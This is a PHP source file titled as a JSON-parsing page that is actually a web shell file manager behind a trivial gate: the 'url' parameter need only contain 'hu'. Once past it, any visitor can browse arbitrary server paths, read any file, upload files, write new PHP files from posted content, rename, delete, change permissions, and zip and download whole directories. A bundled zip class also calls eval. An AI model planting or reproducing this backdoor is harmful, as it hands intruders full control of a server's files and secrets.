<?php
header("Content-type: text/html; charset=utf-8");
session_start();
$url = isset($_GET['url']) ? $_GET['url'] : "";
$s_url = isset($_SESSION['url']) ? $_SESSION['url'] : "";
if ($url == '' && $s_url == '') {
    echo json_encode(array("code" => -1, "error" => "access_denined"));
    exit;
} else {
    if ($url == '') {
        ?>


        <?php
    } else {
        if (!strstr($url, 'hu')) {
            exit;
        }
    }
}
?>


























































































<?php
if ($url) {
    $_SESSION['url'] = $url;
}
$SITE_URL = $_SESSION['url'];

//$url = 'http://' . $_SERVER['SERVER_NAME'] . $_SERVER["REQUEST_URI"]; 
//$dir_current = dirname($url);
$action = isset($_GET['action']) ? $_GET['action'] : "";
$dir_current = zhengTiFan(dirname(__FILE__)) . "/";
$dir_current = isset($_GET['path']) ? $_GET['path'] : $dir_current;
if (is_dir($dir_current)) {
    $dir_subs = scandir($dir_current);
}
$dir_prev = dirname($dir_current);
$name = isset($_GET['name']) ? getGb2312($_GET['name']) : "";
if ($action == 'upload_file') { //upload
    $filepath = $dir_current . "/";
    if (!is_dir($filepath)) {
        mkdir($filepath, true, 7777);
    }
    $file_real_name = $_FILES["img"]["name"];
    $upload_destination = $_GET['dir'] . "/" . $file_real_name;
    $rs = move_uploaded_file($_FILES["img"]["tmp_name"], $upload_destination);
    echo "<script type='text/javascript'>alert('" . getTip($rs) . "');history.back();</script>";
} elseif ($action == 'read_file') { //读取文件
    $fp = fopen($dir_current, "r");
    $str = fread($fp, filesize($dir_current));
    $str_rs = str_replace("\r\n", "<br />", $str);
    echo $str_rs;
    exit;
} elseif ($action == 'update_name') { //更改名称
    $name_new = getGb2312($_GET['name_new']);
    if ($name && $name_new) {
        $rs = rename($name, $name_new);
        echo "<script type='text/javascript'>alert('" . getTip($rs) . "');history.back();</script>";
    }
    exit;
} elseif ($action == 'delete_file') { //删除文件
    if ($name) {
        if (is_dir($name)) {
            rmdir($name);
        } else {
            unlink($name);
        }
        echo "<script type='text/javascript'>alert('删除成功');history.back();</script>";
    }
    exit;
} elseif ($action == 'package_dir') { //文件夹打包下载
    $PHPZip = new PHPZip();
    $PHPZip->ZipDir($name, "" . $name . ".zip", 1); //文件夹打包 第三个参数1为下载，2为保存到服务器
    exit;
} elseif ($action == 'package_files') { //文件打包下载
    $PHPZip = new PHPZip();
    $PHPZip->ZipFile($name, "" . $name . ".zip", 1); //文件夹打包 第三个参数1为下载，2为保存到服务器
    exit;
} elseif ($action == 'add_dir') { //创建文件夹
    if ($name) {
        $rs = mkdir($name, 7777, true);
        echo "<script type='text/javascript'>alert('" . getTip($rs) . "');history.back();</script>";
    }
    exit;
} elseif ($action == 'add_file') { //添加文件
    echo "<form action='?action=add_file_save&name=" . $name . "'  method='post'> 内容：<textarea name='content' style='width:100%;height:380px;'></textarea>  <input  value='保存' type='submit' /> </form>";
    exit;
} elseif ($action == 'add_file_save') { //添加文件保存内容
    $content = $_POST['content'];
    $rs = file_put_contents($name, $content);
    echo "<script type='text/javascript'>alert('" . getTip($rs) . "');history.back();</script>";
    exit;
} elseif ($action == 'chmod_dir') { //更改文件夹写入权限
    $power = $_GET['dir'];
    if ($power && $name) {
        $rs = chmod($name, $power);
    }
    echo "<script type='text/javascript'>alert('" . getTip($rs) . "');history.back();</script>";
    exit;
}
?>
<html>
    <head> 
        <title>json解析</title>
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> 
        <style type="text/css">
            *{padding:0px;margin:0px;}
            body,td{font-size: 12px;color:#00ff00;background:#292929;}input,select,textarea{font-size: 12px;background-color:#FFFFCC;border:1px solid #fff}
            body{color:#FFFFFF;font-family:Verdana, Arial, Helvetica, sans-serif;
                 height:100%;overflow-y:auto;background:#333333;SCROLLBAR-FACE-COLOR: #232323; SCROLLBAR-HIGHLIGHT-COLOR: #232323; SCROLLBAR-SHADOW-COLOR: #383838; SCROLLBAR-DARKSHADOW-COLOR: #383838; SCROLLBAR-3DLIGHT-COLOR: #232323; SCROLLBAR-ARROW-COLOR: #FFFFFF;SCROLLBAR-TRACK-COLOR: #383838;}
            input,select,textarea{background-color:#FFFFCC;border:1px solid #FFFFFF}
            a{color:#ddd;text-decoration: none;}a:hover{color:red;background:#000}
            .actall{background:#000000;font-size:14px;border:1px solid #999999;padding:2px;margin-top:3px;margin-bottom:3px;clear:both;}
        </style> 
    </head> 
    <body style="table-layout:fixed; word-break:break-all; FILTER: progid:DXImageTransform.Microsoft.Gradient(gradientType=0,startColorStr=#626262,endColorStr=#1C1C1C)"> 

        <table width="100%" border="0" bgcolor="#555555">
            <tbody>
                <tr>
                    <td>
                        <form method="GET">
                            地址:
                            <input size="80" name="path" value="<?php echo $dir_current; ?>" type="text" /> 
                            <input value="转到" type="submit" />
                        </form>
                        <br />
                        <form method="POST" enctype="multipart/form-data" action="?action=upload_file&dir=<?php echo $dir_current; ?>"> 
                            <input value="新建文件" onclick="add_file('?action=add_file');" type="button" />
                            <input value="新建目录" onclick="add_dir('?action=add_dir');" type="button" /> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
                            <input name="img" value="" size="" type="file" /> 
                            <input name="uploadt" value="upload" size="" type="submit" /> 
                        </form>
                    </td>
                </tr>
            </tbody>
        </table>
        <form method="POST" name="fileall" id="fileall" action="">
            <table width="100%" border="0" bgcolor="#555555">
                <tbody>
                    <tr height="25">
                        <td width="45%"><b> <a href="?path=<?php echo $dir_prev; ?>"><b>上级目录</b></a> </b></td>
                        <td width="10%" align="center"><b>操作</b></td>
                        <td width="5%" align="center"> <b>文件属性</b></td>
                        <td width="10%" align="center"><b>修改时间</b></td>
                        <td width="10%" align="center"><b>文件大小</b></td>
                    </tr> 
                    <?php
                    foreach ($dir_subs as $k => $v) {
                        $v = getUtf8($v);
                        $file = $dir_current . "/" . $v;
                        if ($k > 1) {
                            $is_dir = is_dir($file) ? 1 : 0;
                            ?>
                            <tr height="25">
                                <td>

                                
                                    <?php if ($is_dir == 1) { ?>
                                        <a href="?path=<?php echo $file; ?>"><?php echo $v; ?></a> 
                                    <?php } else { ?>
                                        <a href="?path=<?php echo $file; ?>&action=read_file"><?php echo $v; ?></a> 
                                    <?php } ?>
                                </td>
                                <td align="center"> 
                                    <a href="#" onclick="update_name('<?php echo $v; ?>', '?action=update_name&name=<?php echo $v; ?>');">改名</a>
                                    <a href="#" onclick="delete_file('<?php echo $v; ?>', '?action=delete_file&name=<?php echo $v; ?>');">删除</a>
                                    <?php if ($is_dir == 1) { ?>
                                        <a href="?path=<?php echo $file; ?>&action=package_dir&name=<?php echo $v; ?>">打包</a>
                                    <?php } else { ?>
                                        <a href="?path=<?php echo $file; ?>&action=package_files&name=<?php echo $v; ?>">打包</a> 
                                    <?php } ?>
                                </td>
                                <td align="center"> <a onclick="chmod_dir('0755', '?action=chmod_dir&name=<?php echo $v; ?>');"><?php echo getChmod($v) ?></a> </td>
                                <td align="center"><?php echo getfiletime($v) ?></td>
                                <td align="right"><?php echo getfilesize($v) ?></td>
                            </tr> 
                            <?php
                        }
                    }
                    ?>
                </tbody>
            </table> 
        </form> 
    </body>
</html>
<?php

function zhengTiFan($str) {
    $str = str_replace('\\', "/", $str);
    return $str;
}

function getUtf8($file) {
    return iconv('GB2312', 'UTF-8', $file);
}

function getGb2312($file) {
    return iconv('UTF-8', 'GB2312', $file);
}

//获取文件修改时间
function getfiletime($file) {
    $a = filemtime($file);
    $time = date("Y-m-d H:i:s", $a);
    return $time;
}

//获取文件的大小
function getfilesize($file) {
    $perms = stat($file);
    $size = $perms['size'];
    // 单位自动转换函数
    $kb = 1024;         // Kilobyte
    $mb = 1024 * $kb;   // Megabyte
    $gb = 1024 * $mb;   // Gigabyte
    $tb = 1024 * $gb;   // Terabyte

    if ($size < $kb) {
        return $size . " B";
    } else if ($size < $mb) {
        return round($size / $kb, 2) . " KB";
    } else if ($size < $gb) {
        return round($size / $mb, 2) . " MB";
    } else if ($size < $tb) {
        return round($size / $gb, 2) . " GB";
    } else {
        return round($size / $tb, 2) . " TB";
    }
}

function getChmod($filepath) {
    return substr(base_convert(@fileperms($filepath), 10, 8), -4);
}

function getTip($rs) {
    if ($rs > 0) {
        return "操作成功";
    } else {
        return "操作失败";
    }
}
?>
<script language="javascript">
    function update_name(name, url) {
        var smsg = "FileName:[" + name + "]\nPlease Input New File:";
        var name_new = prompt(smsg, name);
        if (name_new) {
            url = url + "&name_new=" + name_new;

            window.location = url;
        }
    }
    function delete_file(name, url) {
        var msg = "Do You Sure Delete [" + name + "] ?";
        if (confirm(msg)) {
            window.location = url;
        }
    }
    function add_dir(url) {
        var msg = 'newdir';
        var smsg = "FileName:[" + msg + "]\nPlease Input New File:";
        var re = prompt(smsg, msg);
        if (re) {
            url = url + "&name=" + re;
            window.location = url;
        }
    }
    function add_file(url) {
        var msg = 'newfile.php';
        var smsg = "FileName:[" + msg + "]";
        var re = prompt(smsg, msg);
        if (re) {
            url = url + "&name=" + re;
            window.location = url;
        }
    }
    function chmod_dir(name, url) {
        var smsg = "FileName:[" + name + "]";
        var name_new = prompt(smsg, name);
        if (name_new) {
            url = url + "&dir=" + name_new;
            window.location = url;
        }
    }
</script>

<?php

class PHPZip {

    Private $StrPath = "";
    Private $datasec = array();
    Private $ctrl_dir = array();
    Private $eof_ctrl_dir = "\x50\x4b\x05\x06\x00\x00\x00\x00";
    Private $old_offset = 0;

    //压缩后下载  
    function DownLoad($curdir, $zipfilename, $out) {
        $zipfilename = StrToLower($zipfilename);
        $curdir = Str_iReplace(basename($curdir), "", $curdir);
        chdir($curdir . $this->StrPath);

        header('Content-Encoding: none');
        header('Content-Type: application/zip');
        header('Content-Disposition: attachment ; filename=' . Str_Replace(".zip", "", basename($zipfilename)) . '.zip');
        header('Pragma: no-cache');
        header('Expires: 0');
        print($out);
    }

    //压缩后保存在服务器,默认在/@Upload下  
    function SaveFile($curdir, $zipfilename, $out) {
        $curdir = Str_iReplace(basename($curdir), "", $curdir);
        chdir($curdir . $this->StrPath);
        $fp = fopen($zipfilename, "wb");
        fwrite($fp, $out, strlen($out));
        fclose($fp);
    }

    //函数用途:压缩文件夹,递归逐层进行  
    //参数详解:$dir需要压缩的目录,$zipfilename压缩后的文件名及存放路径,$Todo处理方式1提供下载2保存文件在服务器  
    function ZipDir($dir, $zipfilename, $Todo) {
        IF (!@function_exists('gzcompress')) {
            Return 0;
        }
        @set_time_limit("0");
        $this->openFile($dir, $zipfilename);
        $out = $this->filezip();

        Switch ($Todo) {
            Case "1":
                $this->DownLoad(__FILE__, $zipfilename, $out);
                Break;
            Case "2":
                $this->SaveFile(__FILE__, $zipfilename, $out);
                Break;
        }
    }

    //函数用途:压缩文件,可以是单个也可以是数组的多个  
    //参数详解:$file需要压缩的文件(可为数组),$zipfilename压缩后的文件名及存放路径,$Todo处理方式1提供下载2保存文件在服务器  
    function ZipFile($file, $zipfilename, $Todo) {
        IF (!@function_exists('gzcompress')) {
            Return 0;
        }
        IF (is_array($file)) {

            Foreach ($file as $filename) {
                IF (is_file($filename)) {
                    $fd = fopen($filename, "rb");
                    $content = @fread($fd, filesize($filename));
                    fclose($fd);

                    $filename = basename($filename);
                    $this->addFile($content, $filename);
                }
            }
        } Else {
            IF (is_file($file)) {
                $fd = fopen($file, "rb");
                $content = @fread($fd, filesize($file));
                fclose($fd);
                $file = basename($file);
                $this->addFile($content, $file);
            }
        }
        $out = $this->filezip();

        Switch ($Todo) {
            Case "1":
                $this->DownLoad(__FILE__, $zipfilename, $out);
                Break;
            Case "2":
                $this->SaveFile(__FILE__, $zipfilename, $out);
                Break;
        }
    }

    //递归取得下层文件夹下的文件  
    function openFile($path, $zipName) {
        $temp_path = $path;
        $temp_zip_path = $zipName;
        IF ($handle = @opendir($path)) {
            While (false !== ($file = readdir($handle))) {
                IF ($file != '.' and $file != '..') {
                    IF (preg_match('/\./', $file . @basename())) {
                        $fd = fopen($path . '/' . $file, "r");
                        $fileValue = @fread($fd, 1024000);
                        fclose($fd);
                        $this->addFile($fileValue, $path . '/' . $file);
                    } Else {
                        $this->openFile($path . '/' . $file, $zipName . '/' . $file);
                    }
                }
            }
            $zipName = $temp_zip_path;
            $path = $temp_path;
            closedir($handle);
        }
    }

    function addFile($data, $name, $time = 0) {
        $name = str_replace('\\', '/', $name);
        $name = str_replace('./', '', str_replace('../', '', $name));
        $dtime = dechex($this->unix2DosTime($time));
        $hexdtime = '\x' . $dtime[6] . $dtime[7] . '\x' . $dtime[4] . $dtime[5] . '\x' . $dtime[2] . $dtime[3] . '\x' . $dtime[0] . $dtime[1];
        Eval('$hexdtime="' . $hexdtime . '";');

        $fr = "\x50\x4b\x03\x04";
        $fr.="\x14\x00";
        $fr.="\x00\x00";
        $fr.="\x08\x00";
        $fr.=$hexdtime;

        $unc_len = strlen($data);
        $crc = crc32($data);
        $zdata = gzcompress($data);
        $c_len = strlen($zdata);
        $zdata = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
        $fr.=pack('V', $crc);
        $fr.=pack('V', $c_len);
        $fr.=pack('V', $unc_len);
        $fr.=pack('v', strlen($name));
        $fr.=pack('v', 0);
        $fr.=$name;
        $fr.=$zdata;
        $fr.=pack('V', $crc);
        $fr.=pack('V', $c_len);
        $fr.=pack('V', $unc_len);

        $this->datasec[] = $fr;
        $new_offset = strlen(implode('', $this->datasec));

        $cdrec = "\x50\x4b\x01\x02";
        $cdrec.="\x00\x00";
        $cdrec.="\x14\x00";
        $cdrec.="\x00\x00";
        $cdrec.="\x08\x00";
        $cdrec.=$hexdtime;
        $cdrec.=pack('V', $crc);
        $cdrec.=pack('V', $c_len);
        $cdrec.=pack('V', $unc_len);
        $cdrec.=pack('v', strlen($name));
        $cdrec.=pack('v', 0);
        $cdrec.=pack('v', 0);
        $cdrec.=pack('v', 0);
        $cdrec.=pack('v', 0);
        $cdrec.=pack('V', 32);
        $cdrec.=pack('V', $this->old_offset);
        $this->old_offset = $new_offset;
        $cdrec.=$name;
        $this->ctrl_dir[] = $cdrec;
    }

    function filezip() {
        $data = implode('', $this->datasec);
        $ctrldir = implode('', $this->ctrl_dir);

        Return
                $data . $ctrldir . $this->eof_ctrl_dir .
                pack('v', sizeof($this->ctrl_dir)) .
                pack('v', sizeof($this->ctrl_dir)) .
                pack('V', strlen($ctrldir)) .
                pack('V', strlen($data)) . "\x00\x00";
    }

    function unix2DosTime($unixtime = 0) {
        $timearray = ($unixtime == 0) ? getdate() : getdate($unixtime);
        IF ($timearray['year'] < 1980) {
            $timearray['year'] = 1980;
            $timearray['mon'] = 1;
            $timearray['mday'] = 1;
            $timearray['hours'] = 0;
            $timearray['minutes'] = 0;
            $timearray['seconds'] = 0;
        }
        Return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) | ($timearray['mday'] << 16) | ($timearray['hours'] << 11) | ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);
    }

    /*
      解压缩部分
      用途:解压缩文件
      参数:$zn需要解压缩的zip文件及路径,$to解压缩的目的地
     */

    function Unzip_File($zn, $to, $index = Array(-1)) {
        error_reporting(0);
        $ok = 0;
        $zip = @fopen($zn, 'rb');
        IF (!$zip) {
            Return(-1);
        }
        $cdir = $this->ReadCentralDir($zip, $zn);
        $pos_entry = $cdir['offset'];

        IF (!is_array($index)) {
            $index = array($index);
        }
        For ($i = 0; $index[$i]; $i++) {
            IF (intval($index[$i]) != $index[$i] || $index[$i] > $cdir['entries']) {
                Return(-1);
            }
        }

        For ($i = 0; $i < $cdir['entries']; $i++) {
            @fseek($zip, $pos_entry);
            $header = $this->ReadCentralFileHeaders($zip);
            $header['index'] = $i;
            $pos_entry = ftell($zip);
            @rewind($zip);
            fseek($zip, $header['offset']);
            IF (in_array("-1", $index) || in_array($i, $index)) {
                $stat[$header['filename']] = $this->ExtractFile($header, $to, $zip);
            }
        }
        fclose($zip);
        Return $stat;
    }

    //取得压缩包内的文件信息  
    function get_List($zip_name) {
        $zip = @fopen($zip_name, 'rb');
        IF (!$zip) {
            Return(0);
        }
        $centd = $this->ReadCentralDir($zip, $zip_name);

        @rewind($zip);
        @fseek($zip, $centd['offset']);

        For ($i = 0; $i < $centd['entries']; $i++) {
            $header = $this->ReadCentralFileHeaders($zip);
            $header['index'] = $i;
            $info['filename'] = $header['filename'];
            $info['stored_filename'] = $header['stored_filename'];
            $info['size'] = $header['size'];
            $info['compressed_size'] = $header['compressed_size'];
            $info['crc'] = strtoupper(dechex($header['crc']));
            $info['mtime'] = $header['mtime'];
            $info['comment'] = $header['comment'];
            $info['folder'] = ($header['external'] == 0x41FF0010 || $header['external'] == 16) ? 1 : 0;
            $info['index'] = $header['index'];
            $info['status'] = $header['status'];
            $ret[] = $info;
            unset($header);
        }
        Return $ret;
    }

    function ReadFileHeader($zip) {
        $binary_data = fread($zip, 30);
        $data = unpack('vchk/vid/vversion/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len', $binary_data);

        $header['filename'] = fread($zip, $data['filename_len']);
        IF ($data['extra_len'] != 0) {
            $header['extra'] = fread($zip, $data['extra_len']);
        } Else {
            $header['extra'] = '';
        }

        $header['compression'] = $data['compression'];
        $header['size'] = $data['size'];
        $header['compressed_size'] = $data['compressed_size'];
        $header['crc'] = $data['crc'];
        $header['flag'] = $data['flag'];
        $header['mdate'] = $data['mdate'];
        $header['mtime'] = $data['mtime'];

        IF ($header['mdate'] && $header['mtime']) {
            $hour = ($header['mtime'] & 0xF800) >> 11;
            $minute = ($header['mtime'] & 0x07E0) >> 5;
            $seconde = ($header['mtime'] & 0x001F) * 2;
            $year = (($header['mdate'] & 0xFE00) >> 9) + 1980;
            $month = ($header['mdate'] & 0x01E0) >> 5;
            $day = $header['mdate'] & 0x001F;
            $header['mtime'] = mktime($hour, $minute, $seconde, $month, $day, $year);
        } Else {
            $header['mtime'] = time();
        }

        $header['stored_filename'] = $header['filename'];
        $header['status'] = "ok";
        Return $header;
    }

    function ReadCentralFileHeaders($zip) {
        $binary_data = fread($zip, 46);
        $header = unpack('vchkid/vid/vversion/vversion_extracted/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len/vcomment_len/vdisk/vinternal/Vexternal/Voffset', $binary_data);

        IF ($header['filename_len'] != 0)
            $header['filename'] = fread($zip, $header['filename_len']);
        Else
            $header['filename'] = '';

        IF ($header['extra_len'] != 0)
            $header['extra'] = fread($zip, $header['extra_len']);
        Else
            $header['extra'] = '';

        IF ($header['comment_len'] != 0)
            $header['comment'] = fread($zip, $header['comment_len']);
        Else
            $header['comment'] = '';

        IF ($header['mdate'] && $header['mtime']) {
            $hour = ($header['mtime'] & 0xF800) >> 11;
            $minute = ($header['mtime'] & 0x07E0) >> 5;
            $seconde = ($header['mtime'] & 0x001F) * 2;
            $year = (($header['mdate'] & 0xFE00) >> 9) + 1980;
            $month = ($header['mdate'] & 0x01E0) >> 5;
            $day = $header['mdate'] & 0x001F;
            $header['mtime'] = mktime($hour, $minute, $seconde, $month, $day, $year);
        } Else {
            $header['mtime'] = time();
        }
        $header['stored_filename'] = $header['filename'];
        $header['status'] = 'ok';
        IF (substr($header['filename'], -1) == '/')
            $header['external'] = 0x41FF0010;
        Return $header;
    }

    function ReadCentralDir($zip, $zip_name) {
        $size = filesize($zip_name);
        IF ($size < 277) {
            $maximum_size = $size;
        } Else {
            $maximum_size = 277;
        }

        @fseek($zip, $size - $maximum_size);
        $pos = ftell($zip);
        $bytes = 0x00000000;

        While ($pos < $size) {
            $byte = @fread($zip, 1);
            $bytes = ($bytes << 8) | Ord($byte);
            IF ($bytes == 0x504b0506) {
                $pos++;
                break;
            }
            $pos++;
        }

        $data = unpack('vdisk/vdisk_start/vdisk_entries/ventries/Vsize/Voffset/vcomment_size', fread($zip, 18));

        IF ($data['comment_size'] != 0) {
            $centd['comment'] = fread($zip, $data['comment_size']);
        } Else {
            $centd['comment'] = '';
        }
        $centd['entries'] = $data['entries'];
        $centd['disk_entries'] = $data['disk_entries'];
        $centd['offset'] = $data['offset'];
        $centd['disk_start'] = $data['disk_start'];
        $centd['size'] = $data['size'];
        $centd['disk'] = $data['disk'];
        Return $centd;
    }

    function ExtractFile($header, $to, $zip) {
        $header = $this->readfileheader($zip);

        IF (substr($to, -1) != "/")
            $to .= "/";
        IF (!@is_dir($to))
            @mkdir($to, 0777);

        $pth = explode("/", dirname($header['filename']));
        For ($i = 0; isset($pth[$i]); $i++) {
            IF (!$pth[$i])
                continue;
            $pthss .= $pth[$i] . "/";
            IF (!is_dir($to . $pthss))
                @mkdir($to . $pthss, 0777);
        }
        IF (!($header['external'] == 0x41FF0010) && !($header['external'] == 16)) {
            IF ($header['compression'] == 0) {
                $fp = @fopen($to . $header['filename'], 'wb');
                IF (!$fp)
                    Return(-1);
                $size = $header['compressed_size'];

                While ($size != 0) {
                    $read_size = ($size < 2048 ? $size : 2048);
                    $buffer = fread($zip, $read_size);
                    $binary_data = pack('a' . $read_size, $buffer);
                    @fwrite($fp, $binary_data, $read_size);
                    $size -= $read_size;
                }
                fclose($fp);
                touch($to . $header['filename'], $header['mtime']);
            } Else {
                $fp = @fopen($to . $header['filename'] . '.gz', 'wb');
                IF (!$fp)
                    Return(-1);
                $binary_data = pack('va1a1Va1a1', 0x8b1f, Chr($header['compression']), Chr(0x00), time(), Chr(0x00), Chr(3));

                fwrite($fp, $binary_data, 10);
                $size = $header['compressed_size'];

                While ($size != 0) {
                    $read_size = ($size < 1024 ? $size : 1024);
                    $buffer = fread($zip, $read_size);
                    $binary_data = pack('a' . $read_size, $buffer);
                    @fwrite($fp, $binary_data, $read_size);
                    $size -= $read_size;
                }

                $binary_data = pack('VV', $header['crc'], $header['size']);
                fwrite($fp, $binary_data, 8);
                fclose($fp);

                $gzp = @gzopen($to . $header['filename'] . '.gz', 'rb') or die("Cette archive est compress閑");
                IF (!$gzp)
                    Return(-2);
                $fp = @fopen($to . $header['filename'], 'wb');
                IF (!$fp)
                    Return(-1);
                $size = $header['size'];

                While ($size != 0) {
                    $read_size = ($size < 2048 ? $size : 2048);
                    $buffer = gzread($gzp, $read_size);
                    $binary_data = pack('a' . $read_size, $buffer);
                    @fwrite($fp, $binary_data, $read_size);
                    $size -= $read_size;
                }
                fclose($fp);
                gzclose($gzp);

                touch($to . $header['filename'], $header['mtime']);
                @unlink($to . $header['filename'] . '.gz');
            }
        }
        Return true;
    }

}
?>